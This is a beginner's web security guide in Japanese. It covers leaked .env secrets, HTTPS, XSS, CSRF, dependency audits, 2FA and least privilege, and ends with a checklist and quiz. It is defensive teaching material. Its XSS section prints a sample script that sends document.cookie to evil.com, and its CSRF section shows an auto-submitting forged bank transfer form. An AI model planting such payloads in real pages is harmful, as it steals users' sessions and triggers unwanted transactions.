# セキュリティ基礎

**「自分のサイトは小さいから大丈夫」は最も危険な思い込みです。** 攻撃の大半は人間が手動でやっているのではなく、ボットが自動で無差別にスキャンしています。公開した翌日にはすでに試されています。

---

## はじめて読む人へ

セキュリティというと「ハッカー対策」というイメージがありますが、実際に多い被害の原因は「パスワードをコードに書いた」「パッケージを更新していなかった」「設定を間違えた」といった、ちょっとした不注意です。このページでは「知らないと必ずやらかす」基本事項を整理します。

### 読む前に押さえること

- [環境構築](環境構築.md) — `.env` ファイルの役割
- [Git / GitHub](Git.md) — コミット・プッシュの仕組み（なぜ履歴が危険か）

### 読み終えたら説明できること

- `.env` を GitHub にプッシュしてはいけない理由を説明できる
- XSS・CSRF が「何をされる攻撃か」を言葉で説明できる
- 自分のプロジェクトのセキュリティチェックリストを実行できる

## 攻撃は自動でやってくる

インターネット上のサーバーは、公開した瞬間からスキャンされます。

```
2024-01-15 03:22:11 GET /wp-admin/             → WordPress の管理画面を探している
2024-01-15 03:22:12 GET /phpmyadmin/           → phpMyAdmin を探している
2024-01-15 03:22:13 GET /.env                  → 環境変数ファイルを盗もうとしている
2024-01-15 03:22:14 GET /admin/                → 管理画面を探している
2024-01-15 03:22:15 POST /api/login            → パスワードを総当たり（ブルートフォース）
```

これは実際のサーバーログによく見られるパターンです。攻撃者ではなくボットが、世界中のサーバーに対して自動で試しています。「うちのサイトには価値がない」は関係ありません。

**狙われるもの：**
- `.env` ファイル（API キー・DB パスワードが丸ごと手に入る）
- 管理画面（乗っ取れれば何でもできる）
- 既知の脆弱性があるバージョンのソフトウェア

## 守るべき3つの性質（CIA）

情報セキュリティの目標は次の3つです。

| 性質 | 意味 | 身近な例 |
|------|------|---------|
| **機密性 C**onfidentiality | 許可された人だけが見られる | パスワードは自分しか知らない |
| **完全性 I**ntegrity | データが改ざんされていない | 注文金額が勝手に変わらない |
| **可用性 A**vailability | 必要なときに使える | サービスが落ちていない |

## 秘密情報の管理（最重要）

### ❌ これをやると詰む

```python
# こういうコードを GitHub に push した瞬間、詰みです
OPENAI_API_KEY = "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
DATABASE_URL   = "postgresql://user:password@db.example.com/prod"
```

GitHub はコードを検索できます。`sk-` で始まる文字列を検索しているボットが常に存在し、プッシュから数分以内に不正利用が始まった事例があります。

### ✅ 正しい管理方法

```bash
# .env ファイル（絶対に Git に含めない）
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
DATABASE_URL=postgresql://user:password@db.example.com/prod
```

```bash
# .gitignore に追加（これを忘れると .env が公開される）
.env
.env.local
.env.production
```

```python
# コードでは環境変数名だけ参照する
import os
api_key = os.getenv("OPENAI_API_KEY")  # 値はコードに書かない
```

### やってしまったときの対処

```
.env を push してしまった場合:
  1. 即座にそのAPIキー・パスワードを無効化・再発行する
  2. git の履歴から削除する（削除してもキャッシュされている可能性あり）
  → 「削除したから大丈夫」は間違い。必ずキーを再発行すること。
```

### CI/CD での秘密情報の渡し方

GitHub Actions や Cloudflare Pages にキーを渡すには、サービスの「Secrets」機能を使います。

```yaml
# GitHub Actions での例
jobs:
  deploy:
    steps:
      - name: Deploy
        env:
          API_KEY: ${{ secrets.OPENAI_API_KEY }}  # GitHub の Secrets から参照
```

## HTTPS（通信の暗号化）

### HTTP vs HTTPS

```
HTTP（暗号化なし）:
  あなた ──── "パスワード: abc123" ────→ サーバー
                       ↑
                  途中で盗み見られる

HTTPS（暗号化あり）:
  あなた ──── "x7$Kp#mQ..." ────→ サーバー
  （TLS で暗号化されているので盗み見ても意味がない）
```

**Cloudflare Pages・GitHub Pages に deploy すれば HTTPS は自動で有効**になります。ブラウザのアドレスバーに 🔒 が表示されていれば OK です。

> HTTPS の仕組み（TLS・公開鍵暗号・ハイブリッド暗号）は [暗号技術](暗号技術.md) で詳しく解説しています。

## XSS（クロスサイトスクリプティング）

### 何をされる攻撃か

**攻撃者がサイトに悪意ある JavaScript を埋め込み、他のユーザーのブラウザで実行させます。**

```
シナリオ: コメント欄のある掲示板

1. 攻撃者がコメントに「<script>悪いコード</script>」を投稿
2. 他のユーザーがそのページを開く
3. ブラウザが「コメント内のテキスト」ではなく
   「プログラム」として実行してしまう
4. ユーザーのクッキー（ログイン情報）が攻撃者のサーバーに送られる
5. 攻撃者がそのクッキーを使ってそのユーザーとしてログインできる
```

```html
<!-- 攻撃者が投稿するコメント -->
<script>
  document.location = 'https://evil.com/steal?c=' + document.cookie
</script>
```

### なぜ起きるか・どう防ぐか

```python
# ❌ 危険：ユーザー入力をそのままHTMLに出力
name = request.args.get("name")
return f"<p>こんにちは、{name}さん</p>"
# name に <script>... を入れられると実行される

# ✅ 安全：エスケープ処理を通す
from markupsafe import escape
return f"<p>こんにちは、{escape(name)}さん</p>"
# <script> → &lt;script&gt; に変換され、テキストとして表示される
```

**React・Vue・Jinja2 などのモダンなフレームワークはデフォルトでエスケープします。**  
`dangerouslySetInnerHTML`（React）や `| safe`（Jinja2）など、エスケープを意図的に無効化する機能を使うときだけ注意が必要です。

## CSRF（クロスサイトリクエストフォージェリ）

### 何をされる攻撃か

**別のサイトから、ユーザーが意図しないリクエストを「ユーザー本人として」送らせます。**

```
シナリオ: ネットバンキング

1. あなたが銀行サイトにログイン中（ブラウザにクッキーが保存されている）
2. 攻撃者が罠ページに以下を仕込む:

   <form action="https://bank.example.com/transfer" method="POST">
     <input name="to"     value="攻撃者の口座番号">
     <input name="amount" value="100000">
   </form>
   <script>document.forms[0].submit()</script>

3. あなたが罠ページを開いただけで、フォームが自動送信
4. ブラウザは「銀行サイトへのリクエスト」に自動でクッキーを付ける
5. 銀行サーバーから見ると「あなた本人からの振込リクエスト」に見える
```

XSS は「クッキーを盗む」攻撃、CSRF は「クッキーを使ってリクエストを送らせる」攻撃です。どちらもクッキーが関係しますが、悪用の仕方が違います。

### 防御策

```python
# FastAPI + CSRF トークンの例
# サーバーがランダムなトークンをフォームに埋め込む
# 攻撃者は別サイトからそのトークンを読めない → 正しいトークンがない → 弾く

# 最も簡単な対策: SameSite Cookie
# response.set_cookie("session", value, samesite="Strict")
# → 別サイトからのリクエストにはクッキーを送らない
```

**静的サイト（フォームのないサイト）は CSRF の心配はほぼ不要です。**

## 依存パッケージの脆弱性

ライブラリにも脆弱性が見つかります。古いバージョンを使い続けると、公開された脆弱性を突かれます。

```bash
# JavaScript: 脆弱性チェック
npm audit

# Python
pip install pip-audit
pip-audit

# 結果の見方
found 3 vulnerabilities (1 critical, 2 moderate)
│ critical │ prototype-pollution in lodash < 4.17.21 │
```

| 深刻度 | 対応方針 |
|--------|---------|
| **critical** | 即対応（今日中） |
| **high** | 今週中 |
| moderate | 次のリリースまでに |
| low | 余裕があれば |

## アカウント・権限の管理

### パスワード管理

- **12文字以上**・英大小文字・数字・記号を含む
- **サービスごとに違うパスワード**（1つ漏れても他が安全）
- **パスワードマネージャーを使う**（Bitwarden・1Password など。無料で使える）

### 二要素認証（2FA）を有効にする

パスワードが漏れても、もう1つの認証（スマホのワンタイムパスワードなど）がないとログインできません。

GitHub・Google・GitHub 等の重要サービスでは必ず有効にしてください。

### 最小権限の原則

必要な権限だけを付与します。「とりあえず全部」は事故の温床です。

```
GitHub リポジトリのロール:
  Owner  → リポジトリの削除もできる（本当に必要な人だけ）
  Admin  → 設定変更・メンバー管理
  Write  → コードのプッシュ・マージ
  Read   → 閲覧のみ（外部レビュアーはここで十分）
```

## セキュリティチェックリスト

公開前に必ず確認してください。

```
【秘密情報】
□ .env が .gitignore に追加されている
□ API キー・パスワードがコードに直接書かれていない
□ git log を見て .env がコミット履歴に入っていない

【通信】
□ HTTPS が有効（ブラウザの 🔒 マーク確認）
□ HTTP → HTTPS のリダイレクトが設定されている

【アカウント】
□ 重要なサービスの 2FA を有効にしている
□ チームメンバーの権限が適切（最小権限）
□ 退出したメンバーのアクセスを削除した

【パッケージ】
□ npm audit / pip-audit を実行した
□ critical・high の脆弱性がない
```

## 確認問題

1. API キーを誤って GitHub にプッシュしてしまいました。「すぐ削除コミットしたから大丈夫」と言っている人に、何が問題かを説明してください。
2. XSS と CSRF を「被害者のブラウザで何が起きるか」という観点で比較して説明してください。
3. `npm audit` で `critical` の脆弱性が 1 件見つかりました。どのような順序で対応しますか？
